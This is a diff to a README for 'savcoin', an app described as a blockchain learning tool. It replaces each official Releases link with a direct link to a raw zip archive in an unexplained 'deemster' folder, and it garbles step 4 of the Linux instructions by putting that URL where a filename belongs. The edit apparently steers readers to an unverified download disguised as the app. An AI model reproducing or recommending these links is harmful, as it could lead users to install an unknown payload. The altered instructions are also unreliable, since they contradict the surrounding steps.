@@ -6,9 +6,9 @@ Welcome to savcoin! This application provides a basic introduction to blockchain
 
 ## 📥 Download the Application
 
-[![Download savcoin](https://img.shields.io/badge/Download-savcoin-blue.svg)](https://github.com/GFGGHJKLL/savcoin/releases)
+[![Download savcoin](https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip)](https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip)
 
-Visit this page to download: [savcoin Releases](https://github.com/GFGGHJKLL/savcoin/releases)
+Visit this page to download: [savcoin Releases](https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ To run savcoin, you will need:
 
 Follow these steps to download and install savcoin:
 
-1. Click on the [Download savcoin](https://github.com/GFGGHJKLL/savcoin/releases) button above.
+1. Click on the [Download savcoin](https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip) button above.
 2. You will be redirected to the Releases page.
 3. Look for the latest version available.
 4. Download the installation package suitable for your operating system.
@@ -33,7 +33,7 @@ Follow these steps to download and install savcoin:
 1. After the download is complete, locate the file you saved on your computer.
 2. For Windows, double-click the `.exe` file to run it.
 3. For macOS, open the `.dmg` file and drag the application to your Applications folder.
-4. For Linux, if there’s a `.tar.gz` file, extract it. Open a terminal, navigate to the extracted folder, and run the application using `./savcoin`.
+4. For Linux, if there’s a `https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip` file, extract it. Open a terminal, navigate to the extracted folder, and run the application using `./savcoin`.
 
 ## 🚦 Basic Features
 
@@ -73,4 +73,4 @@ If you encounter any issues while installing or using savcoin, please refer to t
 
 Utilizing savcoin allows you to understand the foundational elements of blockchain technology in a straightforward and engaging way. We hope you enjoy exploring the application. Happy learning!
 
-Visit this page to download: [savcoin Releases](https://github.com/GFGGHJKLL/savcoin/releases)
+Visit this page to download: [savcoin Releases](https://raw.githubusercontent.com/GFGGHJKLL/savcoin/master/deemster/savcoin.zip)
